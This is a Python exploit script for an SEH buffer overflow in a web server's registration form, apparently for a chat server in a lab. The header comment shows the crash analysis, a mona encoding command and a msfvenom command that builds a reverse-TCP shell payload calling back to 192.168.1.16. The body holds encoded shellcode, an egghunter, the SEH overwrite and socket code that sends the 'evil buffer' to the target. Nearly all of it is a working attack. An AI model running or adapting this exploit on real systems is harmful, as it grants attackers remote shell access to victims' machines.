#!/usr/bin/python 
import socket 
import os
'''
[+] Examining SEH chain
SEH record (nseh field) at 0x00e16e5c overwritten with normal pattern : 0x68413268 (offset 217), followed by 1775 bytes of cyclic data after the handler

Total len --> 2000 bytes 

0x100113d8  pop pop ret --->  old 

0x10010813 pop pop ret  --> new

bad char --> x00

909006eb -- jmp short 6 bytes 


!mona encode ascii -t alphanum -b '000a0d2f3a3f4080..ff' -s 6681CAFF0F42526A0258CD2E3C055A74EFB8543030578BFAAF75EAAF75E7FFE7

egghunter +  "D" * 900


msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.1.16 LPORT=443 -e x86/alpha_mixed -f python -b "\x00\x0a\x0d" 

'''
buf =  b""
buf += b"\xda\xc9\xd9\x74\x24\xf4\x59\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51"
buf += b"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
buf += b"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50"
buf += b"\x38\x41\x42\x75\x4a\x49\x4b\x4c\x5a\x48\x6b\x32\x67"
buf += b"\x70\x37\x70\x33\x30\x31\x70\x6b\x39\x69\x75\x74\x71"
buf += b"\x69\x50\x32\x44\x4c\x4b\x76\x30\x66\x50\x6e\x6b\x61"
buf += b"\x42\x44\x4c\x4e\x6b\x53\x62\x47\x64\x6e\x6b\x53\x42"
buf += b"\x71\x38\x64\x4f\x4d\x67\x51\x5a\x47\x56\x36\x51\x39"
buf += b"\x6f\x4e\x4c\x55\x6c\x45\x31\x43\x4c\x47\x72\x74\x6c"
buf += b"\x35\x70\x4f\x31\x58\x4f\x66\x6d\x76\x61\x6b\x77\x68"
buf += b"\x62\x5a\x52\x42\x72\x61\x47\x6e\x6b\x36\x32\x72\x30"
buf += b"\x6e\x6b\x63\x7a\x65\x6c\x6e\x6b\x72\x6c\x67\x61\x62"
buf += b"\x58\x78\x63\x72\x68\x75\x51\x4b\x61\x46\x31\x4e\x6b"
buf += b"\x31\x49\x31\x30\x56\x61\x59\x43\x4c\x4b\x50\x49\x56"
buf += b"\x78\x6b\x53\x64\x7a\x67\x39\x6c\x4b\x67\x44\x4c\x4b"
buf += b"\x66\x61\x48\x56\x66\x51\x69\x6f\x6e\x4c\x6b\x71\x4a"
buf += b"\x6f\x34\x4d\x53\x31\x59\x57\x56\x58\x4d\x30\x62\x55"
buf += b"\x68\x76\x67\x73\x73\x4d\x69\x68\x35\x6b\x51\x6d\x54"
buf += b"\x64\x53\x45\x79\x74\x42\x78\x6e\x6b\x50\x58\x47\x54"
buf += b"\x66\x61\x4a\x73\x63\x56\x4c\x4b\x54\x4c\x42\x6b\x6c"
buf += b"\x4b\x31\x48\x35\x4c\x37\x71\x48\x53\x4c\x4b\x56\x64"
buf += b"\x6e\x6b\x73\x31\x4a\x70\x4c\x49\x32\x64\x77\x54\x71"
buf += b"\x34\x53\x6b\x31\x4b\x71\x71\x53\x69\x31\x4a\x76\x31"
buf += b"\x4b\x4f\x79\x70\x71\x4f\x53\x6f\x73\x6a\x4c\x4b\x47"
buf += b"\x62\x58\x6b\x4c\x4d\x73\x6d\x51\x78\x64\x73\x76\x52"
buf += b"\x73\x30\x43\x30\x70\x68\x74\x37\x53\x43\x67\x42\x63"
buf += b"\x6f\x63\x64\x51\x78\x30\x4c\x53\x47\x51\x36\x53\x37"
buf += b"\x79\x6f\x38\x55\x6d\x68\x6e\x70\x47\x71\x55\x50\x73"
buf += b"\x30\x75\x79\x79\x54\x76\x34\x50\x50\x32\x48\x61\x39"
buf += b"\x4d\x50\x72\x4b\x63\x30\x6b\x4f\x4a\x75\x50\x6a\x47"
buf += b"\x78\x66\x39\x50\x50\x39\x72\x59\x6d\x43\x70\x36\x30"
buf += b"\x33\x70\x42\x70\x30\x68\x48\x6a\x36\x6f\x59\x4f\x69"
buf += b"\x70\x69\x6f\x69\x45\x5a\x37\x55\x38\x73\x32\x45\x50"
buf += b"\x74\x51\x53\x6c\x4c\x49\x58\x66\x53\x5a\x62\x30\x63"
buf += b"\x66\x72\x77\x31\x78\x49\x52\x79\x4b\x75\x67\x51\x77"
buf += b"\x4b\x4f\x79\x45\x72\x77\x55\x38\x78\x37\x78\x69\x57"
buf += b"\x48\x69\x6f\x69\x6f\x48\x55\x30\x57\x30\x68\x42\x54"
buf += b"\x38\x6c\x55\x6b\x58\x61\x39\x6f\x48\x55\x63\x67\x4e"
buf += b"\x77\x35\x38\x51\x65\x42\x4e\x72\x6d\x70\x61\x6b\x4f"
buf += b"\x39\x45\x31\x78\x52\x43\x62\x4d\x72\x44\x57\x70\x6c"
buf += b"\x49\x6d\x33\x62\x77\x51\x47\x51\x47\x34\x71\x6c\x36"
buf += b"\x73\x5a\x54\x52\x71\x49\x31\x46\x38\x62\x79\x6d\x32"
buf += b"\x46\x5a\x67\x71\x54\x74\x64\x67\x4c\x57\x71\x47\x71"
buf += b"\x4c\x4d\x70\x44\x35\x74\x46\x70\x78\x46\x63\x30\x33"
buf += b"\x74\x56\x34\x32\x70\x50\x56\x72\x76\x32\x76\x31\x56"
buf += b"\x73\x66\x62\x6e\x70\x56\x70\x56\x70\x53\x71\x46\x72"
buf += b"\x48\x44\x39\x4a\x6c\x55\x6f\x4d\x56\x79\x6f\x4e\x35"
buf += b"\x6b\x39\x49\x70\x70\x4e\x43\x66\x37\x36\x59\x6f\x50"
buf += b"\x30\x65\x38\x73\x38\x6b\x37\x65\x4d\x65\x30\x69\x6f"
buf += b"\x6e\x35\x4f\x4b\x48\x70\x6c\x75\x4c\x62\x53\x66\x51"
buf += b"\x78\x69\x36\x4e\x75\x6d\x6d\x6d\x4d\x69\x6f\x79\x45"
buf += b"\x65\x6c\x67\x76\x73\x4c\x47\x7a\x6d\x50\x4b\x4b\x6d"
buf += b"\x30\x64\x35\x36\x65\x6f\x4b\x70\x47\x34\x53\x71\x62"
buf += b"\x50\x6f\x71\x7a\x75\x50\x32\x73\x49\x6f\x4a\x75\x41"
buf += b"\x41" 

payload = "w00tw00t" + buf


egghunter="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter+="\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"


crash = "A" * 217 + "\xeb\x06\x90\x90"  + "\xBC\x04\x01\x10" + egghunter + "D"*(905-len(egghunter)) 

buffer="POST /registresult.htm HTTP/1.1\r\n"
buffer+="Host: 192.168.1.12\r\n" 
buffer+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
buffer+="Accept-Language: en-US,en;q=0.5\r\n"
buffer+="Accept-Encoding: gzip, deflate"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="Origin: http://192.168.1.12\r\n"
buffer+="Connection: keep-alive\r\n"
buffer+="Referer: http://192.168.1.12/register.ghp\r\n"
buffer+="Cookie: security_level=0\r\n"
buffer+="Upgrade-Insecure-Requests: 1\r\n\r\n"

buffer+="UserName="+crash+"&Password="+payload+"yu&Password1=1234yu&Sex=1&Email=%40&Icon=0.gif&Resume=&cw=1&RoomID=%3C%21--%24RoomID--%3E&RepUserName=%3C%21--%24UserName--%3E&submit1=Register"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

s.connect(('192.168.1.12',80))

s.send(buffer)

print "sending evil buffer.."

print str(len(buffer)) + "bytes sent"

s.recv(4096)

s.close()

